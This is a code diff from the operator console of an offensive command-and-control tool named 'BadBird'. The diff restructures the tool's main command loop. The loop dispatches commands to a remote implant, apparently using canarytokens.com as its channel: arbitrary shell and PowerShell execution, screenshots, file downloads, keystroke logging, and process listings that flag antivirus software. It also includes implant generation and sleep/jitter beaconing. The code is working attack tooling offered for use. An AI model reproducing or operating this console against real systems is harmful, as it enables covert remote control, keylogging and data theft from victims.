@@ -659,7 +659,6 @@ def animate():
         time.sleep(0.25)
 
 
-
 def main():
     init(convert=True)
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -682,302 +681,301 @@ def main():
     global canaryManagementURL
     try:
         while True:
-
-            if pwd == False:
-                cmd = input(Fore.GREEN + "BadBird>> " + Fore.RESET)
-            else:
-                try:
-                    cmd = input("\n" + Fore.GREEN + dir.strip() + "> " + Fore.RESET)
-                except:
+            try:
+                if pwd == False:
                     cmd = input(Fore.GREEN + "BadBird>> " + Fore.RESET)
-
-            if cmd.lower() == "exit":
-                serverExit()
-
-            elif cmd.lower() == "help":
-                help()
-
-            elif cmd.lower().startswith("local "):
-                try:
-                    print(Fore.BLUE + "[!]" + Fore.RESET + " Local Command Result:")
-                    out = subprocess.run(cmd.split("local ")[1], shell=True)
-
-                except:
-                    pass
-
-
-
-            elif cmd.lower().startswith("connect "):
-                try:
-                    cmd = cmd.replace("connect ", "")
-                    canaryManagementURL = cmd
-                    start = "token="
-                    end = "&auth="
-                    url = ("http://canarytokens.com/about/" + canaryManagementURL[
-                                                              canaryManagementURL.index(start) + len(start):
-                                                              canaryManagementURL.index(end)] + "/contact.php")
-
-
-                except Exception as e:
-                    print(e)
-                    print(Fore.RED + "[-]" + Fore.RESET + " Error, with your input. Please try again.")
-                    continue
-
-
-            elif cmd.lower().startswith("sleep"):
-                if connected:
+                else:
                     try:
-                        sleeptime = cmd.split("sleep ")[1]
-                        try:
-                            jitterpercent = sleeptime.split(" ")[1]
-                        except:
-                            jitterpercent = 0
-                        sleeptime = sleeptime.split(" ")[0]
-                        if int(jitterpercent) > 100 or int(jitterpercent) < 0:
-                            print(Fore.RED + "[-]" + Fore.RESET + " Jitter percentage has to be between 0-100.")
-                            continue
-                        if int(sleeptime) <= 0:
-                            print(Fore.RED + "[-]" + Fore.RESET + " Sleep time must be greater than 0.")
-                            continue
-                        implantSleep(int(sleeptime), int(jitterpercent))
-                        if jitterpercent != 0:
-                            print(Fore.BLUE + "[!]" + Fore.RESET + " Implant will now sleep for " + str(
-                                sleeptime) + " seconds with a " + jitterpercent + "% jitter before checking in with the canarytokens.org server\n")
-                        else:
-                            print(Fore.BLUE + "[!]" + Fore.RESET + " Implant will now sleep for " + str(
-                                sleeptime) + " seconds before checking in with the canarytokens.org server\n")
+                        cmd = input("\n" + Fore.GREEN + dir.strip() + "> " + Fore.RESET)
+                    except:
+                        cmd = input(Fore.GREEN + "BadBird>> " + Fore.RESET)
+
+                if cmd.lower() == "exit":
+                    serverExit()
+
+                elif cmd.lower() == "help":
+                    help()
+
+                elif cmd.lower().startswith("local "):
+                    try:
+                        print(Fore.BLUE + "[!]" + Fore.RESET + " Local Command Result:")
+                        out = subprocess.run(cmd.split("local ")[1], shell=True)
+
+                    except:
+                        pass
+
+
+
+                elif cmd.lower().startswith("connect "):
+                    try:
+                        cmd = cmd.replace("connect ", "")
+                        canaryManagementURL = cmd
+                        start = "token="
+                        end = "&auth="
+                        url = ("http://canarytokens.com/about/" + canaryManagementURL[
+                                                                  canaryManagementURL.index(start) + len(start):
+                                                                  canaryManagementURL.index(end)] + "/contact.php")
 
 
                     except Exception as e:
                         print(e)
+                        print(Fore.RED + "[-]" + Fore.RESET + " Error, with your input. Please try again.")
+                        continue
+
+
+                elif cmd.lower().startswith("sleep"):
+                    if connected:
+                        try:
+                            sleeptime = cmd.split("sleep ")[1]
+                            try:
+                                jitterpercent = sleeptime.split(" ")[1]
+                            except:
+                                jitterpercent = 0
+                            sleeptime = sleeptime.split(" ")[0]
+                            if int(jitterpercent) > 100 or int(jitterpercent) < 0:
+                                print(Fore.RED + "[-]" + Fore.RESET + " Jitter percentage has to be between 0-100.")
+                                continue
+                            if int(sleeptime) <= 0:
+                                print(Fore.RED + "[-]" + Fore.RESET + " Sleep time must be greater than 0.")
+                                continue
+                            implantSleep(int(sleeptime), int(jitterpercent))
+                            if jitterpercent != 0:
+                                print(Fore.BLUE + "[!]" + Fore.RESET + " Implant will now sleep for " + str(
+                                    sleeptime) + " seconds with a " + jitterpercent + "% jitter before checking in with the canarytokens.org server\n")
+                            else:
+                                print(Fore.BLUE + "[!]" + Fore.RESET + " Implant will now sleep for " + str(
+                                    sleeptime) + " seconds before checking in with the canarytokens.org server\n")
+
+
+                        except Exception as e:
+                            print(e)
+                            print(
+                                Fore.RED + "[-]" + Fore.RESET + " Error with sleep command. Format is: sleep <time in seconds> <jitter percent amount>\n")
+                    else:
                         print(
-                            Fore.RED + "[-]" + Fore.RESET + " Error with sleep command. Format is: sleep <time in seconds> <jitter percent amount>\n")
-                else:
-                    print(
-                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
 
 
-            elif cmd.lower().startswith("email "):
-                try:
-                    global email
-                    # regex for a valid email
-                    regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
-                    enteredemail = cmd.split("email ")[1]
-                    if re.fullmatch(regex, enteredemail):
-                        email = enteredemail
-                        print(Fore.BLUE + "[!]" + Fore.RESET + " Will now use `" + email + "` for creating tokens\n")
-                    else:
-                        print(Fore.RED + "[-]" + Fore.RESET + " Invalid email address\n")
-
-                except:
-                    print(Fore.RED + "[-]" + Fore.RESET + " Error with setting new email\n")
-
-
-            elif cmd.lower() == "pwd":
-                if connected:
-                    if not pwd:
-                        print(Fore.BLUE + "[!]" + Fore.RESET + " Now adding current path to output")
-                        pwd = True
-                    else:
-                        print(Fore.BLUE + "[!]" + Fore.RESET + " Removing current path from output")
-                        pwd = False
-                else:
-                    print(
-                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
-
-            elif cmd.lower() == "fallback":
-                if connected:
-                    fallback()
-                else:
-                    print(
-                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
-
-            elif cmd.lower() == "kill":
-                if connected:
-                    killimplant(False)
-                    connected = False
-                else:
-                    print(
-                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
-
-
-            elif cmd.lower() == "kill clean":
-                if connected:
-                    killimplant(True)
-                    connected = False
-                else:
-                    print(
-                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
-
-
-            elif cmd.lower() == "post-exp":
-                if connected:
-                    print("\n")
-                    while True:
-                        cmd = postExpShell()
-                        if cmd != "":
-                            taskCommand(cmd)
-                            lastdictsize = getResults(lastdictsize)
-                            print("")
-                        # Else - means `back` command was entered indicating exit of shell
+                elif cmd.lower().startswith("email "):
+                    try:
+                        global email
+                        # regex for a valid email
+                        regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
+                        enteredemail = cmd.split("email ")[1]
+                        if re.fullmatch(regex, enteredemail):
+                            email = enteredemail
+                            print(Fore.BLUE + "[!]" + Fore.RESET + " Will now use `" + email + "` for creating tokens\n")
                         else:
-                            break
-                else:
-                    print(
-                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+                            print(Fore.RED + "[-]" + Fore.RESET + " Invalid email address\n")
 
-            elif cmd.lower() == "screenshot":
-                if connected:
-                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token for screenshot")
-                    fallback()
-                    time.sleep(1)
-                    print(Fore.BLUE + "[!]" + Fore.RESET + " Sending screenshot command...")
-                    taskCommand("saycheese:")
-                    lastdictsize = getResults(lastdictsize)
-                else:
-                    print(
-                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
-
-            elif cmd.startswith("download "):
-                if connected:
-                    requestedfile = cmd.split("download ")[1]
-                    fallback()
-                    time.sleep(1)
-                    taskCommand("download:" + requestedfile)
-                    lastdictsize = getResults(lastdictsize)
-                else:
-                    print(
-                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+                    except:
+                        print(Fore.RED + "[-]" + Fore.RESET + " Error with setting new email\n")
 
 
-            elif cmd.lower() == "create-implant":
-                if connected:
-                    print(
-                        Fore.RED + "\n[-]" + Fore.RESET + " Warning: You already have a connected implant. If you create a new one, you will lose the old one.")
-                    choice = input(Fore.RED + "[-]" + Fore.RESET + " Do you want to continue? (y/n): ").lower()
-                    if choice == "y" or choice == "yes":
+                elif cmd.lower() == "pwd":
+                    if connected:
+                        if not pwd:
+                            print(Fore.BLUE + "[!]" + Fore.RESET + " Now adding current path to output")
+                            pwd = True
+                        else:
+                            print(Fore.BLUE + "[!]" + Fore.RESET + " Removing current path from output")
+                            pwd = False
+                    else:
+                        print(
+                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+
+                elif cmd.lower() == "fallback":
+                    if connected:
+                        fallback()
+                    else:
+                        print(
+                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+
+                elif cmd.lower() == "kill":
+                    if connected:
+                        killimplant(False)
+                        connected = False
+                    else:
+                        print(
+                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+
+
+                elif cmd.lower() == "kill clean":
+                    if connected:
+                        killimplant(True)
+                        connected = False
+                    else:
+                        print(
+                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+
+
+                elif cmd.lower() == "post-exp":
+                    if connected:
+                        print("\n")
+                        while True:
+                            cmd = postExpShell()
+                            if cmd != "":
+                                taskCommand(cmd)
+                                lastdictsize = getResults(lastdictsize)
+                                print("")
+                            # Else - means `back` command was entered indicating exit of shell
+                            else:
+                                break
+                    else:
+                        print(
+                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+
+                elif cmd.lower() == "screenshot":
+                    if connected:
+                        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token for screenshot")
+                        fallback()
+                        time.sleep(1)
+                        print(Fore.BLUE + "[!]" + Fore.RESET + " Sending screenshot command...")
+                        taskCommand("saycheese:")
+                        lastdictsize = getResults(lastdictsize)
+                    else:
+                        print(
+                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+
+                elif cmd.startswith("download "):
+                    if connected:
+                        requestedfile = cmd.split("download ")[1]
+                        fallback()
+                        time.sleep(1)
+                        taskCommand("download:" + requestedfile)
+                        lastdictsize = getResults(lastdictsize)
+                    else:
+                        print(
+                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+
+
+                elif cmd.lower() == "create-implant":
+                    if connected:
+                        print(
+                            Fore.RED + "\n[-]" + Fore.RESET + " Warning: You already have a connected implant. If you create a new one, you will lose the old one.")
+                        choice = input(Fore.RED + "[-]" + Fore.RESET + " Do you want to continue? (y/n): ").lower()
+                        if choice == "y" or choice == "yes":
+                            if canaryManagementURL == "":
+                                print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token...")
+                                generate_canarytoken()
+                            lootpath = generateimplant(canaryManagementURL)
+                            wait_for_implant()
+                            continue
+                        elif choice == "n" or choice == "no":
+                            continue
+                        else:
+                            print(Fore.RED + "[-]" + Fore.RESET + " Invalid choice. Options are `y/n` or `yes/no`")
+                            continue
+                    else:
                         if canaryManagementURL == "":
                             print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token...")
                             generate_canarytoken()
                         lootpath = generateimplant(canaryManagementURL)
                         wait_for_implant()
-                        continue
-                    elif choice == "n" or choice == "no":
-                        continue
-                    else:
-                        print(Fore.RED + "[-]" + Fore.RESET + " Invalid choice. Options are `y/n` or `yes/no`")
-                        continue
-                else:
-                    if canaryManagementURL == "":
-                        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token...")
-                        generate_canarytoken()
-                    lootpath = generateimplant(canaryManagementURL)
-                    wait_for_implant()
 
-            elif cmd.lower() == "create-token":
-                if connected:
-                    print(
-                        Fore.RED + "\n[-]" + Fore.RESET + " Warning: You already have a token. If you create a new one, you will lose the old one.")
-                    choice = input(Fore.RED + "[-]" + Fore.RESET + " Do you want to continue? (y/n): ").lower()
-                    if choice == "y" or choice == "yes":
-                        connected = False
+                elif cmd.lower() == "create-token":
+                    if connected:
+                        print(
+                            Fore.RED + "\n[-]" + Fore.RESET + " Warning: You already have a token. If you create a new one, you will lose the old one.")
+                        choice = input(Fore.RED + "[-]" + Fore.RESET + " Do you want to continue? (y/n): ").lower()
+                        if choice == "y" or choice == "yes":
+                            connected = False
+                            print(Fore.BLUE + "[!]" + Fore.RESET + " Generating Canarytoken...")
+                            lastdictsize = 1
+                            generate_canarytoken()
+                            wait_for_implant()
+                            continue
+
+                        elif choice == "n" or choice == "no":
+                            continue
+
+                        else:
+                            print(Fore.RED + "[-]" + Fore.RESET + " Invalid choice. Options are `y/n` or `yes/no`")
+                            continue
+                    else:
                         print(Fore.BLUE + "[!]" + Fore.RESET + " Generating Canarytoken...")
-                        lastdictsize = 1
                         generate_canarytoken()
                         wait_for_implant()
-                        continue
 
-                    elif choice == "n" or choice == "no":
-                        continue
+                elif cmd.lower() == "canary-info":
+                    if connected:
+                        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Token: " + token)
+                        print(Fore.BLUE + "[!]" + Fore.RESET + " Alert URL: " + url)
+                        print(Fore.BLUE + "[!]" + Fore.RESET + " Auth Token: " + authtoken)
+                        print(Fore.BLUE + "[!]" + Fore.RESET + " Canary Management URL: " + canaryManagementURL + "\n")
 
                     else:
-                        print(Fore.RED + "[-]" + Fore.RESET + " Invalid choice. Options are `y/n` or `yes/no`")
-                        continue
-                else:
-                    print(Fore.BLUE + "[!]" + Fore.RESET + " Generating Canarytoken...")
-                    generate_canarytoken()
-                    wait_for_implant()
-
-            elif cmd.lower() == "canary-info":
-                if connected:
-                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Token: " + token)
-                    print(Fore.BLUE + "[!]" + Fore.RESET + " Alert URL: " + url)
-                    print(Fore.BLUE + "[!]" + Fore.RESET + " Auth Token: " + authtoken)
-                    print(Fore.BLUE + "[!]" + Fore.RESET + " Canary Management URL: " + canaryManagementURL + "\n")
-
-                else:
-                    print(
-                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
-
-            elif cmd.lower() == "ps":
-                if connected:
-                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Attempting to grab a list of running processes...\n")
-                    print(
-                        Fore.BLUE + "[!]" + Fore.RESET + " Suspected AV processes will be highlighted in " + Fore.RED + "RED" + Fore.RESET)
-                    print(
-                        Fore.BLUE + "[!]" + Fore.RESET + " Explorer and Winlogon processes will be highlighted in " + Fore.BLUE + "BLUE" + Fore.RESET)
-                    print(
-                        Fore.BLUE + "[!]" + Fore.RESET + " Browser processes will be highlighted in " + Fore.GREEN + "GREEN" + Fore.RESET)
-                    print(
-                        Fore.BLUE + "[!]" + Fore.RESET + " Admin tool processes will be highlighted in " + Fore.YELLOW + "YELLOW\n" + Fore.RESET)
-                    taskCommand("tasklist /V")
-                    global ps
-                    ps = True
-                    lastdictsize = getResults(lastdictsize)
-                    ps = False
-
-                else:
-                    print(
-                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
-
-
-            elif cmd.lower().startswith("keystrokes"):
-                if connected:
-                    keychoice = cmd.replace("keystrokes ", "")
-                    if keychoice.lower() != "start" and keychoice.lower() != "stop" and keychoice.lower() != "fetch":
                         print(
-                            Fore.RED + "[-]" + Fore.RESET + " Invalid option. Valid entry is: keystrokes `start` `stop` or `fetch`\n")
-                        continue
+                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+
+                elif cmd.lower() == "ps":
+                    if connected:
+                        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Attempting to grab a list of running processes...\n")
+                        print(
+                            Fore.BLUE + "[!]" + Fore.RESET + " Suspected AV processes will be highlighted in " + Fore.RED + "RED" + Fore.RESET)
+                        print(
+                            Fore.BLUE + "[!]" + Fore.RESET + " Explorer and Winlogon processes will be highlighted in " + Fore.BLUE + "BLUE" + Fore.RESET)
+                        print(
+                            Fore.BLUE + "[!]" + Fore.RESET + " Browser processes will be highlighted in " + Fore.GREEN + "GREEN" + Fore.RESET)
+                        print(
+                            Fore.BLUE + "[!]" + Fore.RESET + " Admin tool processes will be highlighted in " + Fore.YELLOW + "YELLOW\n" + Fore.RESET)
+                        taskCommand("tasklist /V")
+                        global ps
+                        ps = True
+                        lastdictsize = getResults(lastdictsize)
+                        ps = False
+
                     else:
-                        keystrokes(keychoice)
-                else:
-                    print(
-                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+                        print(
+                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+
+
+                elif cmd.lower().startswith("keystrokes"):
+                    if connected:
+                        keychoice = cmd.replace("keystrokes ", "")
+                        if keychoice.lower() != "start" and keychoice.lower() != "stop" and keychoice.lower() != "fetch":
+                            print(
+                                Fore.RED + "[-]" + Fore.RESET + " Invalid option. Valid entry is: keystrokes `start` `stop` or `fetch`\n")
+                            continue
+                        else:
+                            keystrokes(keychoice)
+                    else:
+                        print(
+                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+                        continue
+
+
+                elif cmd.lower().startswith("powershell "):
+                    if connected:
+                        taskCommand("powershell.exe -c " + cmd.split("powershell ")[1])
+                        lastdictsize = getResults(lastdictsize)
+
+                    else:
+                        print(
+                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+
+
+
+                elif cmd.lower().startswith("shell "):
+                    if connected:
+                        cmd = cmd.replace("shell ", "", 1)
+                        taskCommand(cmd)
+                        lastdictsize = getResults(lastdictsize)
+                    else:
+                        print(
+                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+
+                elif cmd == "":
                     continue
 
-
-            elif cmd.lower().startswith("powershell "):
-                if connected:
-                    taskCommand("powershell.exe -c " + cmd.split("powershell ")[1])
-                    lastdictsize = getResults(lastdictsize)
-
+                # If none of the above is true
                 else:
-                    print(
-                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+                    print(Fore.RED + "[-]" + Fore.RESET + " Invalid command. Type `help` for a list of commands\n")
 
-
-
-            elif cmd.lower().startswith("shell "):
-                if connected:
-                    cmd = cmd.replace("shell ", "", 1)
-                    taskCommand(cmd)
-                    lastdictsize = getResults(lastdictsize)
-                else:
-                    print(
-                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
-
-            elif cmd == "":
-                continue
-
-            # If none of the above is true
-            else:
-                print(Fore.RED + "[-]" + Fore.RESET + " Invalid command. Type `help` for a list of commands\n")
-
-    except KeyboardInterrupt:
-        print()
-        serverExit()
-        pass
-
+            except KeyboardInterrupt:
+                print()
+                serverExit()
+                pass
 
     except Exception as e:
         print(Fore.RED + "[-]" + Fore.RESET + " Error: " + str(e))
